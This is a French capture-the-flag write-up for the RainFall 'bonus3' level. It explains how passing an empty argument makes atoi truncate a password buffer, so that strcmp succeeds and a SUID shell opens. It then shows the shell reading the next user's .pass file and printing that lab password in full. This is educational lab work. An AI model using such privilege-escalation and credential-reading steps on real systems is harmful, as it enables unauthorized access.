# bonus3 : Exploitation du comportement d'atoi pour contourner strcmp

## Présentation du Défi

Le programme `bonus3` lit le contenu de `/home/user/end/.pass`, prend un unique argument en ligne de commande, et compare une partie du contenu du fichier avec cet argument. S'ils correspondent, il ouvre un shell. L'objectif est de contourner cette vérification pour obtenir l'accès au compte utilisateur `end`.

## Analyse du Code Source

Le programme lit les 66 premiers octets du fichier de mot de passe dans `password_buffer`. Il utilise ensuite l'argument de ligne de commande (`argv[1]`) dans une séquence critique :

```c
// Convertit l'argument en entier
password_len_arg = atoi(argv[1]);

// Place un terminateur nul basé sur la valeur entière
password_buffer[password_len_arg] = '\0';

// ...

// Compare le buffer potentiellement tronqué avec l'argument original
comparison_result = strcmp(password_buffer, argv[1]);

if (comparison_result == 0) {
    // Ouvre un shell si correspondance
    execl("/bin/sh", "sh", (char *)NULL);
} else {
    // Affiche la seconde partie du fichier (souvent vide à cause d'effets de bord)
    puts(message_buffer);
}
```
Le code contient également des dépassements de buffer (`memset`, premier `fread`) et une logique qui fait que `puts(message_buffer)` n'affiche souvent rien, ce qui a initialement causé une certaine confusion lors de l'analyse. Le débogage a été compliqué par la nature SUID du binaire, empêchant l'inspection directe des lectures de fichiers avec GDB.

L'objectif principal de l'exploitation est de faire réussir la comparaison `strcmp`, déclenchant ainsi l'appel `execl` et l'obtention d'un shell. Pour y parvenir, nous devons exploiter l'utilisation par le programme de `atoi` sur l'argument de ligne de commande et la terminaison nulle subséquente du buffer du mot de passe.


## Vulnérabilité

La vulnérabilité principale réside dans l'interaction entre `atoi`, la terminaison nulle, et `strcmp`. Spécifiquement :
*   `atoi("")` (quand `argv[1]` est une chaîne vide) retourne typiquement `0`.
*   Cela provoque l'exécution de `password_buffer[0] = '\0';`.
*   Ceci transforme effectivement `password_buffer` en une chaîne vide, quel que soit le contenu du fichier lu par `fread`.
*   Le `strcmp(password_buffer, argv[1])` suivant devient `strcmp("", "")`.
*   `strcmp` retourne `0` pour des chaînes identiques, y compris deux chaînes vides.

Cela permet de contourner la logique de comparaison sans avoir besoin de connaître le contenu du fichier de mot de passe ni de se fier aux dépassements de buffer.

## Exploitation

L'exploit consiste à exécuter le programme avec une chaîne vide comme argument de ligne de commande. Cela déclenche la vulnérabilité décrite ci-dessus, faisant que `strcmp` retourne 0 et que le programme exécute `/bin/sh`.

```bash
bonus3@RainFall:~$ ./bonus3 ""
```

## Obtention du Mot de Passe

Une fois que l'exploit a réussi à ouvrir un shell, le mot de passe pour l'utilisateur `end` peut être lu depuis son répertoire personnel :

```bash
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
```

## Passage au Niveau Suivant

Utilisez le mot de passe obtenu pour vous connecter en tant qu'utilisateur `end` :

```bash
bonus3@RainFall:~$ su end
Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
end@RainFall:~$
